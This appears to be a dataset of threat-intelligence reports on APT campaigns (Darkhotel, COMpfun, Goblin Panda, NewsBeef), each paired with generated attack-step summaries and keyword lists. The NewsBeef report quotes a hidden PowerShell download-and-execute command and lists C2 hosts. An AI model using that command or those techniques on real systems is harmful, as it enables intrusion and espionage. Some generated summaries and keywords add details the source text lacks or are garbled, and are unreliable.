Appendix D. The Darkhotel c2 maintain these directory structures to store and serve ddrlog content: • /bin/error/ddrlog • /patch/error/ddrlog23The following structures appear to be common across servers, but do not pro- duce ddrlog and do not maintain an /error/ directory: Two ddrlog files report entries starting January 1, 2009 at 9:16 a.m. • autozone.000space.com • genuinsman.phpnet.us All of the logs maintain a significant number of entries, almost 50,000, with a simple stamp “B” or “l”. Those records are formatted in the following manner:2009.01.01 09:16:00 150.70.xxx.xx > B 2009.01.01 09:16:33 150.70.xxx.xx > B 2009.01.01 09:14:52 220.108.x.xxx > l 2009.01.01 09:16:04 112.70.xx.xx > lonly 120 ip addresses perform the “B” checkin, and 90% of these are from the range 150.70.97.x. This entire range is owned by Trend Micro in Tokyo, Jp. from other ranges owned by Trend Micro in Jp. one outlier comes from an El Sal- vadoran iSp, and another is connected to a Japanese iSp. Approximately 20,000 ip addresses perform the “l” checkin. other ddrlogs may include “A” tags as well. The “A” tag labels unwanted checkins from untargeted locations, like Hungary and italy. The “B” tag labels unwanted checkins from Trend Micro ip ranges. The “l” tag labels unwanted checkins from a variety of ranges, but includes odd Entries in these logs include callback URls that have spaces and unusual charac- ters that do not conform to the required base64 character dictionary.24C2 Communications and Structure Typical main page:for begatrendstone.com, we have the following directory structure: /binread_i.php (main C&C script) login.php (unknown, replies “Wrong iD()”)/bin/error (error logs stored here)ddrlog /bin/tmp /bin/SElhxxwiN3pxxiApxxc9-all.gif /i - encrypted stolen victim system content /l /ffor auto2116.phpnet.us, we have the following directory structure: /patchchkupdate.php (main command and control script)/patch/errorddrlogThe group encrypts victim data on their servers with single user/passkey combi- nations across multiple victims. When an unauthorized user attempts to access a Darkhotel web interface for victim management without the correct passkey, the html page and table layout renders properly, but all the data values on the page are returned as garbled ciphertext.25Victim Management New victim systems appear to be systematically vetted. The attackers maintain a web interface to vet these new victim systems. The attackers first and foremost list and sort victim systems according to their latest c2 check in. Collected data probably is presented in order of importance: 1. user’s logon name 2. system CpU and oS 3. “ping sec”, or how far the victim system is from the c2 4. “in”, or the process that the attackers’ dll code executes within 5. Vac: ?? 6. system lAN ip 7. network WAN ip Here is an example of one of these web pages:26Researcher Activity Clearly, some automated analysis activity involving researchers’ sandbox tools are filling up these logs. from June 2013 to April 2014 (approximately an 11 month period), in only 15 ddrlog files, we observe almost 7,000 connections from research sandbox systems. The network connections provide a1= through a3= values identifying a QEMU based sandbox, all sourced from only 485 WAN ip ad- This system(s) uses a “Dave” user account and “HoME off D5f0AC” Windows system name. These characteristics correspond with network activity generated by Gfi Soft- ware’s “CWsandbox” tools, now owned by “ThreatTrack Security”.27Conclusions for the past seven years, a strong threat actor named Darkhotel, also known as Tapaoux, has carried out a number of successful attacks against a wide range of victims from around the world. it employs methods and techniques which go well beyond typical cybercriminal behavior. The Darkhotel crew’s skillset allows it to launch interesting cryptographical at- tacks, for instance factoring 512 bit RSA keys. its use of 0-days is another indica- tor of a strong threat actor. The targeting of top executives from various large companies around the world during their stay at certain “Dark Hotels” is one of the most interesting aspects of this operation. The exact method of targeting is still unknown - for instance, why some people are targeted while others are not. The fact that most of the time the victims are top executives indicates the attackers have knowledge of their victims whereabouts, including name and place of stay. This paints a dark, dangerous web in which unsuspecting travelers can easily fall. While the exact reason why some hotels function as an attacker vector are unknown, certain suspicions ex- ist, indicating possibly a much larger compromise. We are still investigating this aspect of the operation and will publish more information in the future. A further interesting trait is the deployment of multiple types of campaigns, both targeted and botnet. This is becoming more and more common on the ApT scene, where targeted attacks are used to compromise high profile victims and botnet style operations are used for massive surveillance or performing other tasks such as launching DDoS attacks on hostile parties or simply upgrading victims to more sophisticated espionage tools. We expect the Darkhotel crew to continue their activities against DiB, Govern- ment and NGo sectors. The appendix released with this paper provides technical indicators of compromise which should help victims identify the malicious traffic and enable targets to protect themselves better against attack.Kaspersky Lab HQ39A/3 leningradskoe Shosse Moscow, 125212 Russian federationmore contact detailsTel: fax:+7-495-797-8700 +7-495-797-8709E-mail: info@kaspersky.com Website: www.kaspersky.com ","1. The group compromises hotel Wi-Fi networks and web portals to target executives staying at the hotels. 2. They send spearphishing emails with malicious attachments like document files and Flash files exploiting zero-days. 3. The malicious attachments install first-stage backdoors and droppers on the system. 4. The first-stage malware profiles the victim system and exfiltrates basic system information. 5. If the victim is of interest, second-stage malware like keyloggers are downloaded to steal sensitive data. 6. The malware uses encryption and encoded communications to interact with command and control servers. 7. Stolen data is aggregated centrally for the group to monitor interesting victims. 8. The group spreads campaigns through additional tactics like infected files on peer-to-peer sharing sites. ",valid_89,"['the group', 'compromise', 'executives', 'stay', 'the hotels', 'us', 'Flash', 'first', 'backdoors', 'the system', 'the victim system', 'system information', 'interest', 'sec', 'keyloggers', 'data', 'the malware', 'encryption', 'code', 'communications', 'command and control servers', 'victims', 'campaigns']",the group; compromise; executives; stay; the hotels; us; Flash; first; backdoors; the system; the victim system; system information; interest; sec; keyloggers; data; the malware; encryption; code; communications; command and control servers; victims; campaigns.
"5/15/2020COMpfun authors spoof visa application with HTTP status-based Trojan | SecurelistCOMpfun authors spoof visa application with HTTP status- based Trojansecurelist.com/compfun-http-status-based-trojan/96874By GReATYou may remember that in autumn 2019 we published a story about how a COMpfun successor known as Reductor infected ﬁles on the ﬂy to compromise TLS trafﬁc. If you’re wondering whether the actor behind the malware is still developing new features, the answer is yes. Later in November 2019 our Attribution Engine revealed a new Trojan with strong code similarities. Further research showed that it was obviously using the same code base as COMPFun. What’s of interest inside The campaign operators retained their focus on diplomatic entities, this time in Europe, and spread the initial dropper as a spoofed visa application. It is not clear to us exactly how the malicious code is being delivered to a target. The legitimate application was kept encrypted inside the dropper, along with the 32- and 64-bit next stage malware.Overall infection chain. Interestingly, C2 commands are rare HTTP status codesWe observed an interesting C2 communication protocol utilizing rare HTTP/HTTPS status codes (check IETF RFC 7231, 6585, 4918). Several HTTP status codes (422-429) from the Client Error class let the Trojan know what the operators want to do. After the control server sends the status “Payment Required” (402), all these previously received commands are executed.url authors spoof visa application with HTTP status-based Trojan | SecurelistThe authors keep the RSA public key and unique HTTP ETag in encrypted conﬁguration data. Created for web content caching reasons, this marker could also be used to ﬁlter unwanted requests to the C2, e.g., those that are from network scanners rather than targets. Besides the aforementioned RSA public key to communicate with the C2, the malware also uses a self- generated AES-128 key. Who is the author? We should mention here once again that the COMPfun malware was initially documented by G- DATA in 2014; and although the company did not identify which APT was using the malware. Based mostly on victimology, we were able to associate it with the Turla APT with medium-to-low level of conﬁdence. What the Trojan is able to do Its functions include the ability to acquire the target’s geolocation, gathering host- and network- related data, keylogging and screenshots. In other words, it’s a normal full-ﬂedged Trojan that is also capable of propagating itself to removable devices.As in previous malware from the same authors, all the necessary function addresses resolve dynamically to complicate analysis. To exﬁltrate the target’s data to the C2 over HTTP/HTTPS, the malware uses RSA encryption. To hide data locally, the Trojan implements LZNT1 compression and one-byte XOR encryption.Encrypted data Exﬁltrated keystrokes, screenshots, etc.Algorithm RSAConﬁguration data in .rsrc sectionParameters inside the HTTP GET/POST requestsCommands and arguments from C2 for HTTP status 427 (dir, upl, usb, net)XOR (plus LZN‐ T1 compression) AES-128 (plus AES-128Key source Public key from conﬁg‐ uration data Hardcoded one-byte key Generated by Trojan and shared in beaconGenerated by Trojan and shared in beaconEncryption and compression used by the Trojan for various tasks Initial dropper The ﬁrst stage dropper was downloaded from the LAN shared directory. The ﬁle name related to the visa application process perfectly corresponds with the targeted diplomatic entities. As with all modules with a similar code base, the dropper begins by dynamically resolving all the required Windows API function addresses and puts them into structures. It then decrypts the next stage malware from its resource (.rsrc) section. The algorithm used to decrypt the next stage is a one- byte XOR using the key “0x55”, followed by LZNT1 decompression.url authors spoof visa application with HTTP status-based Trojan | SecurelistThe following ﬁles are dropped to the disk in addition to the original application that the malware tries to mimic:MD5 hash ieframe.dll.muiExplorerFrame.dll.‐ muiFeatures 64-bit Trojan version 32-bit Trojan versionThe dropper urges users to run the ﬁle as administrator (using messages such as “need to run as admin”), then drops a version corresponding to the host’s architecture and sets the ﬁle system timestamp to 2013.12.20 22:31.Interestingly, the dropper’s abilities aren’t limited to PE lures; as an alternative, this stage is also able to use .doc and .pdf ﬁles. In such cases, the dropper will open the ﬁles using the “open” shell command instead of running the legitimate spoofed executable application. Main module – HTTP status-based TrojanSHA256MD5 2015.06.26 09:42:27 (GMT) I386 Windows GUI DLL 593408 ExplorerFrame.dll.muiThe analysis below is based on the 32-bit sample from the table above. The legitimate ExplorerFrame.dll.mui is a language resource for the ExplorerFrame.dll ﬁle used by Windows Explorer.url authors spoof visa application with HTTP status-based Trojan | SecurelistMulti-threaded Trojan features such as monitoring USB devices to spread further and receiving commands as HTTP status codes Initialization As usual in this malware family’s code, a huge number of short standalone functions return all the readable strings. This is done to complicate analysis by not allowing the strings to be visible at a glance for researchers. The module’s preparation stage dynamically resolves all required Windows API function addresses into corresponding custom structures. Afterwards the malware uses indirect function calls only.The module obtains the processor architecture (32- or 64-bit) and Windows OS version. It includes a number of anti-analysis checks for virtual machine-related devices (VEN_VMWARE, VBOX_HARDDISK, Virtual_DVD_ROM, etc.) to avoid controlled execution. It also notes which security products are running on the host (Symantec, Kaspersky, Dr.Web, Avast).Before every communication with the C2, the malware checks if software such as debuggers (WinDbg, OllyDbg, Visual Studio) and host (Process Explorer or Monitor, etc.) or network monitoring (Wireshark, TCPView, etc.) programs are running. It also checks for internet connectivity and does not attempt to communicate if the checks fail.The DLL also checks for potentially available launch processes that it can inject itself into. In the case of PaymentRequired, this could be system, security product or browser processes. Then the malware forms the corresponding code to drop ﬁles, delete ﬁles, etc.url authors spoof visa application with HTTP status-based Trojan | SecurelistThe last step in the initialization procedure is to decrypt and decompress the conﬁguration ﬁle. Decryption is done via a one-byte XOR using the 0xAA key, followed by decompression using the LZNT1 algorithm. From the conﬁguration, the malware parses the RSA public key, ETag and IP addresses to communicate with its control servers.Decrypted conﬁguration data contains an RSA public key to encrypt exﬁltrated data, C2 IPs and unique ETag to communicate with them HTTP status-based communication module Firstly, the module generates the following:AES-128 encryption key used in HTTP GET/POST parameters and HTTP status code 427 (request new command); 4-byte unique hardware ID (HWID) based on the host network adapters, CPU and ﬁrst ﬁxed logical drive serial number.The module then chooses a process to inject the code into, in order of decreasing priority, starting from Windows (cmd.exe, smss.exe), security-related applications (Symantec’s nis.exe, Dr.Web’s spideragent.exe) and browsers (IE, Opera, Firefox, Yandex browser, Chrome).The main thread checks if the C2 supports TLS in its conﬁguration. If it does, communication will be over HTTPS and port 443; otherwise, the HTTP protocol and port 80 are used.Conﬁg Parameter Value Encryption key ETagRSA public key on the image above C8E9CEAD2E084F58A94AEDC14D423E1Aurl authors spoof visa application with HTTP status-based Trojan | SecurelistC2 IPs95.183.49[.]10 95.183.49[.]29 200.63.45[.]35Decrypted conﬁguration content inside the analyzed sampleThe ﬁrst GET request sent contains an ETag “If-Match” header that is built using data from its decrypted conﬁguration. ETags are normally used by web servers for caching purposes in order to be more efﬁcient and save bandwidth by not resending redundant information if an ETag value matches. The implementation of ETags means the C2 may ignore all requests that are not sent from its intended targets if they don’t have the required ETag value.HTTP RequestsCorresponding command functionalitySend collected target data to C2 with current tickcount This status is the signal to process received (and stored in binary ﬂag) HTTP statuses as commands Uninstall. Delete COM-hijacking persistence and corre‐ sponding ﬁles on disk Install. Create COM-hijacking persistence and drop corre‐ sponding ﬁles to disk Fingerprint target. Send host, network and geolocation data Get new command into IEA94E3.tmp ﬁle in %TEMP%, decrypt and execute appended command Propagate self to USB devices on targetEnumerate network resources on targetC2 HTTP status code descriptions, including installation, USB propagation, ﬁngerprinting, etc.HTTP 427 can receive any of the following appended commands:Com‐ usbCommand functionalitySend directory content to C2 encrypted with RSA public key from conﬁg Send ﬁle to C2 encrypted with RSA public key from conﬁg Not implemented yet. Possibly same function planned as for HTTP status 428url authors spoof visa application with HTTP status-based Trojan | SecurelistnetNot implemented yet. Possibly same function planned as for HTTP status 429Removable device propagation module If initialization is successful, the malware starts one more thread for dispatching Windows messages, looking for removable devices related to a WM_DEVICECHANGE event. The module runs its own handlers in the event of a USB device being plugged into or unplugged from the host. Other spying modules: keylogger, screenshot tool and more The user’s activity is monitored using several hooks. All of them gather the target’s data independently of any C2 command. Keystrokes are encrypted using the RSA public key stored in the conﬁguration data and sent once every two seconds, or when moreа than 512 bytes are recorded. These 512 characters also include left mouse button clicks (written as the “MSLBTN” string) and Windows title bar texts. For clipboard content, the module calculates an MD5 hash and if it changes, encrypts the clipboard content with the same RSA public key and then sends it.In a separate thread, the Trojan takes a bitmap screenshot using the GDIPlus library, compresses it with the LZNT1 algorithm, encrypts it using the key from the conﬁguration data and sends it to the control server. A screenshot will be taken of the target and sent anyway, independently of any C2 command. Last but not least There are several choices – albeit not major additional technical ones – that the malware author made which we consider to be noteworthy.The COM-hijacking-based persistence method injects its corresponding code and structure as a parameter into a legitimate process’s memory. The malware geolocates victims using legitimate web services: geoplugin.net/json.gp, ip-api.com/json and telize.com/geoip.The unusual thread synchronization timeout calculation in the HTTP status thread is peculiar. Mathematically, the partial sum of the series is precisely:This series, in the case of a full sum, is just a representation of the exponent. The developers probably used the exponent to make timeouts in the communication thread more unpredictable and grow at a fast rate, and the compiler calculated it this way.So what did the COMPFun authors achieve?url authors spoof visa application with HTTP status-based Trojan | SecurelistWe saw innovative approaches from the COMpfun developers twice in 2019. First, they bypassed TLS encrypted trafﬁc via PRNG system function patching, and then we observed a unique implementation of C2 communications using uncommon HTTP status codes.The malware operators retained their focus on diplomatic entities and the choice of a visa-related application – stored on a directory shared within the local network – as the initial infection vector worked in their favor. The combination of a tailored approach to their targets and the ability to generate and execute their ideas certainly makes the developers behind COMPFun a strong offensive team. Indicators of compromise File MD5 Hashes Trojan 32-bit: A6AFA05CBD04E9AF256D278E5B5AD050 Trojan 64-bit: 1BB03CBAD293CA9EE3DDCE6F054FC325IPs "," 1. The malware is distributed as a spoofed visa application file placed on a shared directory on the local network. 2. When the visa application is opened, it drops executable files ieframe.dll.mui and ExplorerFrame.dll.mui which contain the Trojan payload. 3. The Trojan initializes by resolving API functions, performing anti-analysis checks, and decrypting its configuration data. 4. It chooses a process to inject into - often a system or security process. 5. It contacts the C2 server over HTTP or HTTPS using rare status codes to receive commands. 6. Based on the status code received, it can install persistence, gather system info, spread via USB, etc. 7. It exfiltrates data like keystrokes, screenshots, and system info encrypted with an RSA public key. 8. The Trojan also continually gathers data like keystrokes and screenshots independently of C2 commands. 9. It spreads to USB devices when they are connected by injecting itself. 10. The C2 can also send arbitrary commands to the Trojan to further control the compromised system. ",valid_22,"['the malware', 'a spoofed visa application', 'shared directory', 'the local network', 'the visa application', 'IE', 'ExplorerFrame.dll', 'the Trojan', 'anti-analysis checks', 'decrypt', 'data', 'a process', 'system', 'the C2', 'HTTPS', 'the status', 'persistence', 'Keystrokes', 'screenshots', 'encrypt', 'an RSA public key', 'C2 commands', 'USB devices', 'itself', '10']",the malware; a spoofed visa application; shared directory; the local network; the visa application; IE; ExplorerFrame.dll; the Trojan; anti-analysis checks; decrypt; data; a process; system; the C2; HTTPS; the status; persistence; Keystrokes; screenshots; encrypt; an RSA public key; C2 commands; USB devices; itself; 10.
"Goblin Panda targets Cambodia sharing capacities with another Chinese group hackers Temp Periscopemedium.com/@Sebdraven/goblin-panda-targets-cambodia-sharing-capacities-with-another-chinese-group-hackers-temp-periscope-7871382ffcc0 SebdravenSeptember 7, 2018I keep on my hunting of Goblin Panda and I’ve just found two new country targeted by them: Cambodia and South Korea.This post deals with only the CambodiaThe first document uses the same technics to drop on disk a legit file vietnamese-organizations.htmlThe c2 that is contacted by the dll is weather.gbaycruise.com has the same IP used during the same NS server.2/4the dns name baoin.baotintu.com is contacted by rat. The RTF document writen in Cambodian is CambodiaChinese Espionage Group TEMP.Periscope Targets Cambodia Ahead of July 2018 Elections and Reveals… Introduction FireEye has examined a range of TEMP.Periscope activity revealing extensive interest in Cambodia's…www.fireeye.com I found an RTF document elections.This domain update.wsmcoff.com is used by also Temp Periscope.Goblin Panda against the Bears During my last investigation (here), I’ve found two RTFs malware documents with the same techniques of exploitation of…medium.com The rtfs documents for dropping the backdoor has build by the same exploit rtf kits used by Goblin Panda and all domains are registered in NAMECHEAP INC.4/4 ","1. Goblin Panda sends a malicious RTF file to victims in Cambodia. 2. The RTF file exploits a vulnerability to install a legitimate file and a RAT malware on the victim's machine. 3. The RAT contacts a command and control server at weather.gbaycruise.com. 4. The C2 server has ties to infrastructure used in Goblin Panda's past attacks on Vietnam. 5. Goblin Panda uses similar exploit tools, malware, and infrastructure in the attacks on Cambodia and Vietnam. 6. There are links through domain registration patterns between the Cambodia/Vietnam attacks and infrastructure used by Chinese group Temp Periscope. 7. Another RTF file targeting Cambodia contacts IP address 103.243.175.181, associated with a domain used to attack Cambodian elections. 8. The tactics, tools, and infrastructure suggest Goblin Panda carried out the intrusion campaigns against Cambodia and South Korea using techniques also leveraged by Temp Periscope. ",valid_32,"['Goblin Panda', 'RTF', 'RAT', 'malware', 'weather.gbaycruise.com', 'C2', 'ties', 'Vietnam', 'Chinese', 'Temp Periscope', 'IP', 'Cambodian', 'South Korea', 'techniques']",Goblin Panda; RTF; RAT; malware; weather.gbaycruise.com; C2; ties; Vietnam; Chinese; Temp Periscope; IP; Cambodian; South Korea; techniques.
"7/5/2019‘Twas the night before | Securelist‘Twas the night beforesecurelist.com/twas-the-night-before/91599By GReATRecently, the United States Cyber Command (USCYBERCOM Malware Alert @CNMF_VirusAlert) highlighted several VirusTotal uploads of theirs – and the executable objects relating to 2016 – 2017 NewsBeef/APT33 activity are interesting for a variety of reasons. Before continuing, it’s important to restate yet again that we defend customers, and research malware and intrusions, regardless of their source. Accordingly, subscribers to our private APT intelligence reports receive unique and extraordinary data on the signiﬁcant activity and campaigns of over 100 APTs from all over the world, including this 2016-2017 NewsBeef /APT33 activity.USCYBERCOM’s VirusTotal executable object uploads appeared in our January 2017 private report “NewsBeef Delivers Christmas Presence”, an examination of a change in the tactics used in spear-phishing and watering hole attacks against Saudi Arabian targets. Two ﬁles uploaded by USCYBERCOM are of particular interest. These were ﬁrst jquerycode-download[.]live/ﬂashplayer23pp_xa_install.exe jquerycode-download[.]live/chrome_update.exe Detected as BSS:Exploit.Win32.Generic, Trojan-Downloader.Win32.Powdr.a, Trojan- jquerycode-download[.]live/citrixreceiver.exe jquerycode-download[.]live/citrixcertiﬁcate.exe ntg-sa[.]com/downloads/citrix_certiﬁcate.exe Detected as BSS:Exploit.Win32.Generic, Trojan-Downloader.PowerShell.Agent.ah, DangerousObject.Multi.GenericIn order to share insight into Cyber Command’s highlighted malware and its context, some of our private report’s content will be re-written here. The January 2017 report followed up on other private reports published on the group’s BeEF-related activity in 2015 and 2016. All of them cover a thread of mid-2015 activity continuing into 2016, then resetting and advancing in 2016 and into 2017. Bear in mind that regardless of current leaks, which do not always present exhaustive information on group participants, activity from the region has had multiple overlaps and presents a confusion of internal dynamics… NewsBeef Delivers Christmas Presence Examination of a change in tactics used in spearphishing and watering hole attacks against Saudi Arabian targetsurl‘Twas the night before | SecurelistExecutive summary The NewsBeef APT previously engaged in long-term, elaborate social engineering schemes that take advantage of popular social network platforms. Previous analysis of the NewsBeef APT indicates that the group focuses on Saudi Arabian (SA) and Western targets, and lacks advanced offensive technology development capabilities.In previous campaigns, NewsBeef relied heavily on its namesake technology, the Browser Exploitation Framework (BeEF). However, in the summer of 2016, the group deployed a new toolset that includes macro-enabled Ofﬁce documents, PowerSploit, and the Pupy backdoor. The most recent NewsBeef campaign uses this toolset in conjunction with spearphishing emails, links sent over social media/standalone private messaging applications, and watering hole attacks that leverage compromised high- proﬁle websites (some belonging to the SA government). The group changed multiple characteristics year over year – tactics, the malicious JavaScript injection strategically placed on compromised websites, and command and control C2 infrastructure.In a nutshell:The NewsBeef actor deployed a new toolset in a campaign that focused primarily on Saudi Arabian targets; BeEF does not appear to be deployed as a part of the current campaign; Compromised government and infrastructure-related websites are injected with JavaScript that geolocates and redirects visitors to spoofed, attacker-controlled web-servers; Improvements in JavaScript injection and obfuscation may extend server persistence; NewsBeef continues to deploy malicious macro-enabled Ofﬁce documents, poisoned legitimate Flash and Chrome installers, PowerSploit, and Pupy toolsTechnical Analysis The NewsBeef campaign is divided into two main attack vectors, spearphishing and strategic web compromise (watering hole) attacks. The group’s spearphishing component uses malicious, macroenabled, Microsoft Ofﬁce documents that deliver PowerShell scripts. The scripts download poisoned installers (e.g. Flash, Citrix Client, and Chrome) from an online presence (in at least one case, the group spoofed a legitimate, well-known IT services organization). Once the installer is downloaded to a victim machine, it runs PowerSploit scripts that in turn download and execute a full- featured Pupy backdoor.On December 25, 2016, the NewsBeef APT stood up a server to host a new set of Microsoft Ofﬁce documents (maintaining malicious macros and PowerShell scripts) to support its spear-phishing operations. The group sent these documents (or links to them) to targets via email, and over social network and standalone messaging clients.To compromise websites and servers, the group identiﬁed vulnerable sites and injected obfuscated JavaScript that redirected visitors to NewsBeef-controlled hosts (which tracked victims and served malicious content). These compromised servers includeurl‘Twas the night before | SecurelistSaudi Arabian government servers and other high-value organizational identities relevant to their targets. Targets, social engineering, delivery chain The majority of NewsBeef targets that our researchers have observed are located in SA. Targeting proﬁles include:Government ﬁnancial and administrative organizations Government health organizations Engineering and technical organizations One British labor related government organization (targeted multiple times)The bulk of the targets were affected through strategic web compromises, especially via compromised government servers. However, Kaspersky Security Network (KSN) records also contain links that victims clicked from the Outlook web client “outlook.live.com” as well as attachments arriving through the Outlook desktop application. This behavior falls in line with previous NewsBeef operations, where the group used other standalone messaging clients to send malicious links. Interestingly, NewsBeef set up its server using the hosting provider “Choopa, LLC, US”, the same hosting provider that the group used in attacks over the summer of 2016.The domain “ntg-sa[.]com” appears to be an attempt by the NewsBeef actor to spoof the legitimate Saudi IT services organization, “National Technology Group” (NTG) at, “ntg.com[.]sa”. The malicious documents served at the spoofed website are shown below:url‘Twas the night before | SecurelistNTG is a legitimate company that provides IT services and support to SA government organizations and communications ﬁrms (as well as international ﬁnancial groups and retailers), making it a high-value identity. Spooﬁng the identity of an IT service provider is a particularly important asset to threat actors that can abuse the inherent trust of IT organizations to push software (which may appear suspicious if served from another source). NTG’s IT focus and client list likely aided NewsBeef’s delivery of malicious PowerShell-enabled Ofﬁce documents and poisoned installers.url‘Twas the night before | SecurelistIn December 2016, the following active URLs were served from the spoofed NTG identity. All of the poisoned installers are technologies that an IT support service may be expected to deliver.hxxps://ntg-sa[.]com/Downloads/ﬂashplayer23pp_xa_install.exe hxxps://ntg-sa[.]com/Downloads/Citrix_Certiﬁcate.exe hxxps://ntg-sa[.]com/Downloads/Chrome_Update.exeIn this scenario, the poisoned Flashplayer, Citrix, or Chrome installer drops the ﬁle “install.bat”. The batch ﬁle runs the PowerShell command:powershell.exe -w hidden -noni -nop -c “iex(New-Object System.Net.WebClient).DownloadString(‘url′)The command downloads “eiloShaegae1”, another PowerShell downloader script. This second PowerShell downloader script downloads and runs the payload; a PowerSploit ReﬂectivePEInjection script, “hxxp://139.59.46[.]154:3485/IMo8oosieVai”.The script maintains and then decodes a base64 string. This base64 string, is the Pupy backdoor DLL, which is loaded and run in-memory, never touching the disk. This Pupy backdoor immediately communicates with 139.59.46[.1]54 over obfs3, posting collected system data and retrieving commands.This selection of “The Threebfuscator” for command and control (C2) communications is interesting, because it is an obfuscating protocol used to mask Tor communications. It is possible that the use of obfs3 indicates the attackers’ understanding of its effectiveness against outbound connection monitoring.Another notable spoofed domain used during this campaign is the “maps-modon[.]club” domain. The domain “maps.modon.gov[.]sa” was compromised in December 2016, and the “maps-modon[.]club” domain created on December 8, 2016. The domain shared theurl‘Twas the night before | Securelistsame IP address (45.76.32[.]252) as “ntg-sa[.]com”. Although we did not observe any malicious documents retrieved from that domain, it is likely that the domain served the same documents as ntg-sa[.]com. The ﬁlenames of the malicious Ofﬁce documents (hosted at the spoofed NTG site) are relevant to typical IT and contracting resources and indicate that this scheme relies on effective social engineering tactics related to human resources and IT activities.In other schemes, the attackers sent macro-enabled Ofﬁce attachments from spoofed law ﬁrm identities (or other relevant service providers) to targets in SA. The law ﬁrm in this scheme is based in the United Kingdom and is the sole location for targets outside of SA for this campaign. Below is a screenshot of a fake legal proposal in Word doc format, containing malicious macros and PowerShell code.The malicious document follows the same chain as the poisoned Flash player or Chrome Installer:url‘Twas the night before | SecurelistCompromised servers and injected JavaScript Starting in October 2016, NewsBeef compromised a set of legitimate servers (shown below), and injected JavaScript to redirect visitors to hxxp://analytics- google[.]org:69/Check.aspx:The entire list of compromised servers is exclusively Saudi Arabian, and includes organizations from the following industries:Energy services for industrial processes Telecom engineering and implementation services Shipping and logistics Metal engineering and manufacturing Information technology services Cement and building materialsThese recent attacks against legitimate servers (when compared to previous NewsBeef activity) indicate that NewsBeef operators have improved their technical skills, speciﬁcally their ability to covertly inject JavaScript code into served web pages. Their injection and obfuscation techniques enable the actor to serve the same JavaScript with every page visit to the “watering hole” site as well as increase the difﬁculty of identifying the malicious JavaScript source on compromised sites.For example, on a Saudi government website, the NewsBeef APT delivered packed JavaScript into the bottom of a referenced script that is included in every page served from the site (the packed and unpacked JavaScript is shown below). The JavaScript forces visiting web browsers to collect and send (via a POST request) web browser, browser version, country of origin, and IP address data to the attacker controlled server “jquerycodedownload[.]live/check.aspx”.It is likely that this collection of visitor information represents an attempt to limit the number of infections to a speciﬁc target subset and reduce the attacker’s operational footprint. Although we did not identify injected JavaScript related to the “analytics- google[.]org/check.aspx” redirections, it is likely that it performed similar data collectionurl‘Twas the night before | Securelistand exﬁltration (via POST). This technique appears to be an improvement over the simple .JPG beaconing which researchers observed in previous NewsBeef watering hole attacks. Packed JavaScript:The most trafﬁcked of the compromised sites (which redirect to “jquerycode- download[.]live”) appears to be the government site at “scsb.gov[.]sa/portal/”. A high volume of redirections from the compromised site continues into mid-January 2017.url‘Twas the night before | SecurelistBelow is a list of compromised websites and the associated URL that serves the injected, second layer JavaScript. Note that the JavaScript resource changes on every compromised website among many other referenced JavaScript sources, making it difﬁcult to track down the source of the malicious script per site:www.taqa.com[.]sa/Scroll-jquery.jsurl‘Twas the night before | Securelist199099.gov[.]sa/_LAYOUTS/Yesser.NCC/js/jquery-1.7.2.min.jsMultiple other relevant sites were compromised and redirecting as well. The Pupy backdoor Pupy is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function backdoor. The backdoor is mainly written in Python and uses code from other open source attack tools like PowerSploit, Mimikatz, laZagne, etc. Pupy can generate backconnect or bindport payloads in multiple formats: PE executables (x86/x64) for Windows, ELF binary/.so for Linux, reﬂective DLLs (x86/x64), pure Python ﬁles, PowerShell, apk, and Rubber Ducky script (Windows).The malicious DLL deployed by NewsBeef contains Python code, a Python interpreter, and the MSVC runtime library as well as code that loads the Python interpreter, runs Python code and exports some functions for Python. A conﬁguration string contains base64-encoded Python code (packed with zlib) with transport conﬁguration and information about C2 server addresses.When initiated, the Python code attempts to retrieve and use SOCKS/HTTP proxy settings from the victim’s computer. The Python code then tries to initiate a reverse connection to the C2 server (139.59.46[.]154:3543) using a TCP protocol with RSA+AES trafﬁc encryption and obfs3 transport using default keys from Pupy sources.url‘Twas the night before | SecurelistAfter a successful connection, NewsBeef Pupy sends information about the infected computer and waits for commands (which take the form of modules) from the C2 server. The C2 server can send modules with Python code and compiled Python C extensions. The main functionality of the backdoor is implemented in packages (Python code, compiled Python C extensions, compiled executable ﬁles) and modules (Python code). Modules can directly access Python objects on the remote client using the RPyC module. The Python modules win32com, win32api, and ctypes are used to interact with the Win32 API. Attackers can use standard modules or write their own. All modules are executed in the memory (a Pupy process can migrate between processes using the Previous reports on the NewsBeef APT noted the group’s reliance on open-source tools to launch simple, yet effective attacks. Historically, the group has used BeEF to track targets and deliver malicious payloads. However, as this recent campaign indicates, the NewsBeef APT appears to have shifted its intrusion toolset away from BeEF and towards macro-enabled malicious Ofﬁce documents, PowerSploit, and Pupy. Despite this shift in toolset, the group still relies on old infrastructure as evidenced by their reuse of servers hosted by the service providers Choopa and Atlantic.net.The improvements in tactics, techniques and procedures appears to have paid off. The most recent campaign indicates that the group was able to compromise a larger number of sites including valuable, high-proﬁle SA government identities. However, despite these improvements in technology, the NewsBeef APT continues to rely on social engineering schemes and open-source tools – attributes that increase the chances of identiﬁcation.NewsBeef attacks against Saudi Arabian organizations and individuals (as well as targets in the European Union) are likely to continue. Additionally, researchers expect that as the group evolves, its tasking will expand to other organizations doing business with, or connected to Saudi Arabian organizations and individuals.Due to the group’s speciﬁc target set, it is crucial that SA security teams, administrators, and developers (especially web application administrators/developers) update their WordPress, Joomla, and Drupal-based web applications and plugins – as these assets are actively scanned and exploited by this APT. AppendixRelated Object MD5 (executable code, malicious ofﬁce Hosting malicious docs, executables, PowerShell and Pupy backdoorsmoh.com-ho[.]me/Health_insurance_plan.doc moh.com-ho[.]me/Health_insurance_registration.doc mol.com-ho[.]me/cv_itworx.doc mci.com-ho[.]me/cv_mci.doc jquerycode-download[.]live/ﬂashplayer23pp_xa_install.exe jquerycode-download[.]live/citrixcertiﬁcate.exe jquerycode-download[.]live/chrome_update.exe jquerycode-download[.]live/CitrixReceiver.exe jquerycode-download[.]live/check.aspx jquerycode-download[.]live/CheckLog.aspx urlﬁcate.exe urlﬂashplayer23pp_xa_install.exe url url url url url url url url url url‘Twas the night before | Securelisturl url url url url url taqa.com[.]sa/arabic/resumes/resume.doc taqa.com[.]sa/arabic/resumes/resume.doc taqa.com[.]sa/arabic/resumes/cv-taqa.doc taqa.com[.]sa/arabic/images/certiﬁcate.crt.exe taqa.com[.]sa/arabic/tempdn/cv-taqa.doc 104.218.120[.]128/pro.bat 104.218.120[.]128/msservice-a-2.exe 104.218.120[.]128/msservice-a-4.exe 104.218.120[.]128/check.aspx 104.218.120[.]128:69/checkFile.aspx 